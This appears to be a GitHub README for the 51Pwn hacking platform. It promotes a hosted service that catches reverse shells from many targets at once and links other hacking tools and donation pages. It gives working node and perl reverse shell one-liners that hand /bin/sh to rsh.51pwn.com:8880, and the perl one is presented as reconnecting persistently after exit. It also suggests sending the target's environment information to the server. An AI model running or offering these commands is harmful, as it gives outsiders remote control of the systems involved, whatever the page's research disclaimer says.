### 声明：这不是投毒！ 而是供应链安全漏洞的研究、验证、bug-bounty

# Free one id Multi-target web netcat for reverse shell
one id Multi-target
![xx](https://github.com/hktalent/51Pwn-Platform/assets/18223385/d2d503a6-7fed-428b-8cec-6ef78af2adb7)
<img width="760" alt="image" src="https://github.com/hktalent/51Pwn-Platform/assets/18223385/bcb19c88-eba2-4ddb-9f54-9691b5729a81">

- Site: https://51pwn.com/indexes/xterm.html?id=YourId
- reverse server: rsh.51pwn.com:8880

* 1 one id Multi-target concurrency reverse shell
* 2 setYourId: xxxx_001 
** The id must be sent to the server as soon as the reverse shell connects to the server to facilitate association with your web.（id 必须在reverse shell连接服务器后第一时间发送给服务器，便于和你的web进行关联）
** awesome： It is no longer a simple nc -lnvtp xxx, but can accept several target reverse shells at the same time.（他不再是简单的nc -lnvtp xxx，而是可以同时接受若干目标reverse shell）

* 2 start your reverse shell
  *** id is a unique identification and association between you and all reverse shell targets（id 是 唯一标识、关联你与所有reverse shell 目标之前的关联、关系）
  *** The second line is a json data, which can usually be used to collect the target's environment information and feed it back to the server. Of course you can give feedback {}。
  第二行是一个json 数据，通常可以用来收集目标的环境信息，反馈给server。当然你可以反馈一个空的{}
Note: A good reverse shell will keep reconnecting to the server even if you type exit
  注意：一个优秀的reverse shell会吃重要，即便你输入 exit 也会不断重新连接到服务器
```
node -e '(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(8880, "rsh.51pwn.com", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client);client.write("YourId\n{}\n");client.write("{}\n") }); return /a/;})();'
```
  *** 特别推荐下面的命令，经过若干 AI 的优化，可以覆盖 90% 以上的服务器上正确运行, 下面的命令明显比上面的更加优化，即便你关闭浏览器，或者输入exit，下面的代码会自动重新上线
```
  perl -e 'use Socket;while (1) {socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(8880,inet_aton("rsh.51pwn.com")))){print S "YourId\n{}\n";open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");if (fork() == 0){exec("/bin/sh -i");}wait();}};'
```
* open your browser
  *** 注意后面的id必须和上面的一致
https://51pwn.com/indexes/xterm.html?id=YourId
 ** 注意，这个时候你什么也没有看见，没错，因为还没有目标连接上来 **

"""


# <a href=https://www.zhihu.com/question/614532345/answer/3139952074 target=_blank>哪里有免费的视频监控报警系统？</a>
<a href="https://chat.51pwn.com:2083/?cnId=Change2YourHomeId&atRd=true&showme=true&eAi=true&startChat=1">https://chat.51pwn.com</a>

# 51Pwn-Platform
51Pwn Platform

A Big Data Platform for Information Security Practitioners

ContactMe：[https://chat.51pwn.com](https://chat.51pwn.com)

Channel：51pwn

<img width="839" alt="image" src="https://github.com/hktalent/51Pwn-Platform/assets/18223385/14dd522a-c3f5-40df-94d2-1eeda7d36220">

# Online
<a href=https://51pwn.com/CyberChef/>Awesome Hacking Online Encoding, Decoding Platform</a>

https://51pwn.com/51pwn/#/

<img width="600" alt="image" src="https://user-images.githubusercontent.com/18223385/230257785-7370678f-06c0-44f7-a78c-dba3a63a6f4e.png">


https://51pwn.com/HackTools/
<div align='center'>
  <a href=https://51pwn.com/HackTools/><img alt="preview_1" src="https://github.com/hktalent/Hack-Tools/raw/51pwn/src/assets/img/preview.gif?raw=true" /></a>
</div>

<img width="478" alt="image" src="https://user-images.githubusercontent.com/18223385/206604822-a7486cff-f9d6-417a-918e-09ce5ad2b839.png">
<img width="444" alt="image" src="https://user-images.githubusercontent.com/18223385/206605600-9da7ec38-ba45-496e-9410-6a454673cc40.png">
<img width="467" alt="image" src="https://user-images.githubusercontent.com/18223385/206605674-2f4b2d37-f709-4829-94cc-bc232b85d50f.png">

<img width="853" alt="image" src="https://user-images.githubusercontent.com/18223385/205871638-f0272ddd-14bc-4cd4-9a25-084f8fe75722.png">
<img width="991" alt="image" src="https://user-images.githubusercontent.com/18223385/205872225-86befc7f-a123-4b5f-a5fb-085eba4b9af3.png">
<img width="974" alt="image" src="https://user-images.githubusercontent.com/18223385/205872724-e95e571e-5d93-4adc-98e2-9c21d8105e04.png">

# demo
点击看大图
|img| img | img | img |img |
| --- | --- | --- | --- | --- |
|<img width="907" alt="image" src="https://user-images.githubusercontent.com/18223385/205869405-0c2b1071-9e00-421e-8aac-30394cd86cbd.png">|<img width="1012" alt="image" src="https://user-images.githubusercontent.com/18223385/205869588-ee591157-c693-4382-ab87-1e81799dc9e5.png">|<img width="870" alt="image" src="https://user-images.githubusercontent.com/18223385/205869708-e76a7986-fe6a-4973-a0b3-b9178b9ad4f2.png">|<img width="800" alt="image" src="https://user-images.githubusercontent.com/18223385/205869924-d2722031-a4b7-40c5-8aca-956ab1d46bec.png">|<img width="516" alt="image" src="https://user-images.githubusercontent.com/18223385/205870296-da6a2968-1448-4ec1-b43b-e0c3989b8c5b.png">|

# How use
捐赠1000元即可享受1年服务

# Donation
| Wechat Pay | AliPay | Paypal | BTC Pay |BCH Pay |
| --- | --- | --- | --- | --- |
|<img src=https://raw.githubusercontent.com/hktalent/myhktools/main/md/wc.png>|<img width=166 src=https://raw.githubusercontent.com/hktalent/myhktools/main/md/zfb.png>|[paypal](https://www.paypal.me/pwned2019) **miracletalent@gmail.com**|<img width=166 src=https://raw.githubusercontent.com/hktalent/myhktools/main/md/BTC.png>|<img width=166 src=https://raw.githubusercontent.com/hktalent/myhktools/main/md/BCH.jpg>|
